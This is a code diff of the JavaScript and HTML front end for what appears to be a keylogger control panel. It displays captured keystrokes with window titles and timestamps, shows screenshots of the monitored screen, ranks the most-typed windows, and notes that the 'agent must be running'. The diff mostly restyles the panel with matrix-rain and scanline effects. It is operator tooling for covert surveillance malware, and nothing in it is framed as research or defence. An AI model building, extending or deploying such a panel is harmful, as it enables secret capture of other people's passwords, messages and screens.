   </div>
-</main>
+</div>
 
 <!-- LIGHTBOX -->
-<div class="lightbox" id="lightbox" onclick="closeLb()">
-  <button class="lb-close">✕ CLOSE</button>
-  <img id="lb-img" src="" alt=""/>
+<div class="lightbox" id="lightbox" onclick="closeLb(event)">
+  <button class="lb-close" onclick="closeLb()">✕ CLOSE</button>
+  <div class="lb-frame">
+    <div class="lb-scanline"></div>
+    <img id="lb-img" src="" alt=""/>
+  </div>
   <div class="lb-meta" id="lb-meta"></div>
 </div>
 
 <script>
-  // ── State ─────────────────────────────────
-  let page       = 1;
-  let autoRef    = true;
-  let timer      = null;
-  let loaded     = [];
-  let filterTxt  = '';
-  let activeTab  = 'keys';
+// ── Cursor ─────────────────────────────────
+const cursorEl = document.getElementById('cursor');
+document.addEventListener('mousemove', e => {
+  cursorEl.style.left = e.clientX+'px';
+  cursorEl.style.top  = e.clientY+'px';
+});
 
-  const CTRL_KEYS = ['esc','ctrl','alt','cmd','super','menu'];
-  const SPEC_KEYS = ['enter','backspace','tab','space','shift','caps_lock',
-    'delete','up','down','left','right','home','end',
-    'page_up','page_down','f1','f2','f3','f4','f5','f6',
-    'f7','f8','f9','f10','f11','f12'];
+// ── Clock ──────────────────────────────────
+const startTs = Date.now();
+function tick(){
+  const now = new Date();
+  document.getElementById('sys-clock').textContent =
+    now.toTimeString().slice(0,8);
+  const up = Math.floor((Date.now()-startTs)/1000);
+  const h=String(Math.floor(up/3600)).padStart(2,'0');
+  const m=String(Math.floor(up%3600/60)).padStart(2,'0');
+  const s=String(up%60).padStart(2,'0');
+  document.getElementById('a-uptime').textContent=`${h}:${m}:${s}`;
+}
+setInterval(tick,1000); tick();
 
-  function keyClass(k){
-    const l = k.toLowerCase();
-    if(CTRL_KEYS.some(s=>l===s)) return 'control';
-    if(SPEC_KEYS.some(s=>l===s)) return 'special';
-    return 'char';
-  }
+// ── Matrix rain (dim) ──────────────────────
+const cvs = document.getElementById('matrix-bg');
+const ctx  = cvs.getContext('2d');
+function resizeCvs(){ cvs.width=window.innerWidth; cvs.height=window.innerHeight; }
+resizeCvs();
+window.addEventListener('resize', resizeCvs);
+const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*アイウエオカキクケコ01';
+const fs=12; let drops=[];
+function initDrops(){ drops=Array(Math.floor(cvs.width/fs)).fill(1); }
+initDrops();
+setInterval(()=>{
+  ctx.fillStyle='rgba(0,5,0,0.06)';
+  ctx.fillRect(0,0,cvs.width,cvs.height);
+  ctx.font=fs+'px VT323';
+  drops.forEach((y,i)=>{
+    ctx.fillStyle=Math.random()>.97?'#ffffff':'#00ff41';
+    ctx.globalAlpha=Math.random()*.3+.05;
+    ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*fs,y*fs);
+    ctx.globalAlpha=1;
+    if(y*fs>cvs.height&&Math.random()>.975) drops[i]=0;
+    drops[i]++;
+  });
+},50);
 
-  // ── Fetch ─────────────────────────────────
-  async function loadEvents(){
-    try{
-      const r = await fetch(`/api/events?page=${page}`);
-      const d = await r.json();
-      loaded  = d.events;
-      document.getElementById('stat-total').textContent = d.total;
-      renderLogs();
-      updatePg(d.total, d.per_page);
-    }catch(e){ console.error(e); }
-  }
+// ── State ──────────────────────────────────
+let pg=1, autoRef=true, timer=null, loaded=[], filterTxt='', activeTab='keys';
 
-  async function loadStats(){
-    try{
-      const r = await fetch('/api/stats');
-      const d = await r.json();
-      document.getElementById('stat-windows').textContent = d.top_windows.length;
-      document.getElementById('stat-ss').textContent      = d.total_screenshots;
-    }catch(e){ console.error(e); }
-  }
+const CTRL=['esc','ctrl','alt','cmd','super','menu','win'];
+const SPEC=['enter','backspace','tab','space','shift','caps_lock','delete',
+  'up','down','left','right','home','end','page_up','page_down',
+  'f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12'];
 
-  async function loadScreenshots(){
-    try{
-      const r = await fetch('/api/screenshots?limit=20');
-      const d = await r.json();
-      const g = document.getElementById('ss-grid');
-      if(!d.screenshots.length){
-        g.innerHTML='<div class="empty-state"><div class="empty-icon">📷</div><div>NO SCREENSHOTS YET</div></div>';
-        return;
-      }
-      g.innerHTML = d.screenshots.map(s=>`
-        <div class="ss-card" onclick="openLb('${s.image}','${esc(s.timestamp)} | ${esc(s.window)}')">
-          <img class="ss-img" src="data:image/jpeg;base64,${s.image}" loading="lazy"/>
-          <div class="ss-meta">
-            <span class="ss-ts">${esc(s.timestamp)}</span>
-            <span class="ss-win">${esc(s.window)}</span>
-          </div>
-        </div>`).join('');
-    }catch(e){ console.error(e); }
-  }
+function keyClass(k){
+  const l=k.toLowerCase();
+  if(CTRL.some(s=>l===s)) return 'control';
+  if(SPEC.some(s=>l===s)) return 'special';
+  return 'char';
+}
 
-  // ── Render logs ───────────────────────────
-  // Format: 2026-03-27 00:25:19 | New Tab - Google Chrome | s
-  function renderLogs(){
-    const body = document.getElementById('log-body');
-    let rows = loaded;
-    if(filterTxt) rows = rows.filter(e=>e.window.toLowerCase().includes(filterTxt));
-    if(!rows.length){
-      body.innerHTML=`<div class="empty-state"><div class="empty-icon">⌨</div><div>AWAITING KEYSTROKES</div></div>`;
+// ── Fetch ──────────────────────────────────
+async function loadEvents(){
+  try{
+    const r=await fetch(`/api/events?page=${pg}`);
+    const d=await r.json();
+    loaded=d.events;
+    document.getElementById('s-keys').textContent=d.total;
+    renderLogs();
+    updatePg(d.total,d.per_page);
+    // animate bar
+    const pct=Math.min(100,d.total/10);
+    document.getElementById('bar-keys').style.width=pct+'%';
+  }catch(e){console.error(e);}
+}
+
+async function loadStats(){
+  try{
+    const r=await fetch('/api/stats');
+    const d=await r.json();
+    document.getElementById('s-wins').textContent=d.top_windows.length;
+    document.getElementById('s-ss').textContent=d.total_screenshots;
+    document.getElementById('bar-ss').style.width=Math.min(100,d.total_screenshots*5)+'%';
+    const wl=document.getElementById('win-list');
+    if(!d.top_windows.length){
+      wl.innerHTML='<div style="font-size:10px;color:rgba(0,255,65,.2);letter-spacing:2px;">AWAITING DATA...</div>';
       return;
     }
-    body.innerHTML = rows.map(e=>{
-      const cls = keyClass(e.key);
-      return `<div class="log-line">
-        <span class="log-ts">${esc(e.timestamp)}</span>
-        <span class="sep">|</span>
-        <span class="log-win">${esc(e.window)}</span>
-        <span class="sep">|</span>
-        <span class="log-key ${cls}">${esc(e.key)}</span>
-      </div>`;
-    }).join('');
+    const max=d.top_windows[0].count;
+    wl.innerHTML=d.top_windows.map(w=>`
+      <div class="win-item">
+        <div class="win-name"><span class="win-count">${w.count}</span>${esc(w.window)}</div>
+        <div class="win-track"><div class="win-fill" style="width:${Math.round(w.count/max*100)}%"></div></div>
+      </div>`).join('');
+  }catch(e){console.error(e);}
+}
+
+async function loadScreenshots(){
+  try{
+    const r=await fetch('/api/screenshots?limit=20');
+    const d=await r.json();
+    const g=document.getElementById('ss-grid');
+    if(!d.screenshots.length){
+      g.innerHTML='<div class="empty-feed" style="grid-column:1/-1"><div class="big">📷</div><div>NO FRAMES CAPTURED</div></div>';
+      return;
+    }
+    g.innerHTML=d.screenshots.map(s=>`
+      <div class="ss-card" onclick="openLb('${s.image}','${esc(s.timestamp)} | ${esc(s.window)}')">
+        <img class="ss-img" src="data:image/jpeg;base64,${s.image}" loading="lazy"/>
+        <div class="ss-overlay">[ VIEW FRAME ]</div>
+        <div class="ss-meta">
+          <span class="ss-ts">${esc(s.timestamp)}</span>
+          <span class="ss-win">${esc(s.window)}</span>
+        </div>
+      </div>`).join('');
+  }catch(e){console.error(e);}
+}
+
+// ── Render logs ────────────────────────────
+function renderLogs(){
+  const feed=document.getElementById('log-feed');
+  let rows=loaded;
+  if(filterTxt) rows=rows.filter(e=>e.window.toLowerCase().includes(filterTxt));
+  if(!rows.length){
+    feed.innerHTML=`<div class="scanline-effect"></div><div class="empty-feed"><div class="big">⌨</div><div>AWAITING KEYSTROKES</div><div style="font-size:12px;opacity:.5;">AGENT MUST BE RUNNING</div></div>`;
+    return;
   }
+  feed.innerHTML='<div class="scanline-effect"></div>'+rows.map(e=>{
+    const cls=keyClass(e.key);
+    return `<div class="log-row">
+      <span class="log-ts">${esc(e.timestamp)}</span>
+      <span class="log-sep">|</span>
+      <span class="log-win">${esc(e.window)}</span>
+      <span class="log-sep">|</span>
+      <span class="log-key ${cls}">${esc(e.key)}</span>
+    </div>`;
+  }).join('');
+}
 
-  function filterLogs(){
-    filterTxt = document.getElementById('search-input').value.toLowerCase();
-    renderLogs();
-  }
+function doFilter(){
+  filterTxt=document.getElementById('search').value.toLowerCase();
+  renderLogs();
+}
 
-  function updatePg(total, perPage){
-    const pages = Math.ceil(total/perPage)||1;
-    document.getElementById('pg-info').textContent    = `Page ${page} / ${pages}`;
-    document.getElementById('total-info').textContent = `${total} events`;
-    document.getElementById('prev-btn').disabled = page<=1;
-    document.getElementById('next-btn').disabled = page>=pages;
-  }
+function updatePg(total,perPage){
+  const pages=Math.ceil(total/perPage)||1;
+  document.getElementById('pg-info').textContent=`${pg}/${pages}`;
+  document.getElementById('total-info').textContent=`${total} EVT`;
+  document.getElementById('prev-btn').disabled=pg<=1;
+  document.getElementById('next-btn').disabled=pg>=pages;
+}
 
-  // ── Controls ──────────────────────────────
-  function changePage(d){ page = Math.max(1,page+d); loadEvents(); }
+// ── Controls ───────────────────────────────
+function changePg(d){ pg=Math.max(1,pg+d); loadEvents(); }
 
-  function switchTab(t){
-    activeTab = t;
-    document.getElementById('pane-keys').style.display = t==='keys'?'flex':'none';
-    document.getElementById('pane-ss').style.display   = t==='ss'?'flex':'none';
-    document.getElementById('tab-keys').className = 'tab-btn'+(t==='keys'?' active':'');
-    document.getElementById('tab-ss').className   = 'tab-btn'+(t==='ss'?' active':'');
-    if(t==='ss') loadScreenshots();
-  }
+function switchTab(t){
+  activeTab=t;
+  document.getElementById('pane-keys').className='pane'+(t==='keys'?' active':'');
+  document.getElementById('pane-ss').className='pane'+(t==='ss'?' active':'');
+  document.getElementById('nav-keys').className='nav-tab'+(t==='keys'?' active':'');
+  document.getElementById('nav-ss').className='nav-tab'+(t==='ss'?' active':'');
+  if(t==='ss') loadScreenshots();
+}
 
-  function toggleAR(){
-    autoRef = !autoRef;
-    const cls = 'toggle'+(autoRef?' on':'');
-    document.getElementById('ar-toggle').className    = cls;
-    document.getElementById('ar-toggle-ss').className = cls;
-    autoRef ? startTimer() : stopTimer();
-  }
+function toggleAR(){
+  autoRef=!autoRef;
+  const cls='toggle'+(autoRef?' on':'');
+  document.getElementById('ar-toggle').className=cls;
+  document.getElementById('ar-toggle-ss').className=cls;
+  autoRef?startTimer():stopTimer();
+}
 
-  function startTimer(){
-    if(timer) clearInterval(timer);
-    timer = setInterval(()=>{
-      loadEvents(); loadStats();
-      if(activeTab==='ss') loadScreenshots();
-    }, 2000);
-  }
+function startTimer(){
+  if(timer) clearInterval(timer);
+  timer=setInterval(()=>{
+    loadEvents(); loadStats();
+    if(activeTab==='ss') loadScreenshots();
+  },2000);
+}
+function stopTimer(){ if(timer) clearInterval(timer); }
 
-  function stopTimer(){ if(timer) clearInterval(timer); }
+async function clearLogs(){
+  if(!confirm('PURGE ALL LOGS AND SCREENSHOTS FROM SERVER MEMORY?')) return;
+  await fetch('/api/clear',{method:'POST'});
+  pg=1; loadEvents(); loadStats();
+}
 
-  async function clearLogs(){
-    if(!confirm('Clear ALL logs and screenshots from server memory?')) return;
-    await fetch('/api/clear',{method:'POST'});
-    page=1; loadEvents(); loadStats(); loadScreenshots();
-  }
+// ── Lightbox ───────────────────────────────
+function openLb(b64,meta){
+  document.getElementById('lb-img').src=`data:image/jpeg;base64,${b64}`;
+  document.getElementById('lb-meta').textContent=meta;
+  document.getElementById('lightbox').classList.add('open');
+}
+function closeLb(e){
+  if(!e||e.target===document.getElementById('lightbox')||e.currentTarget.classList.contains('lb-close'))
+    document.getElementById('lightbox').classList.remove('open');
+}
 
-  // ── Lightbox ──────────────────────────────
-  function openLb(b64,meta){
-    document.getElementById('lb-img').src        = `data:image/jpeg;base64,${b64}`;
-    document.getElementById('lb-meta').textContent = meta;
-    document.getElementById('lightbox').classList.add('open');
-  }
-  function closeLb(){ document.getElementById('lightbox').classList.remove('open'); }
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
-  function esc(s){
-    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  }
-
-  // ── Init ──────────────────────────────────
-  loadEvents(); loadStats(); startTimer();
+// ── Init ───────────────────────────────────
+loadEvents(); loadStats(); startTimer();
 </script>
 </body>
 </html>
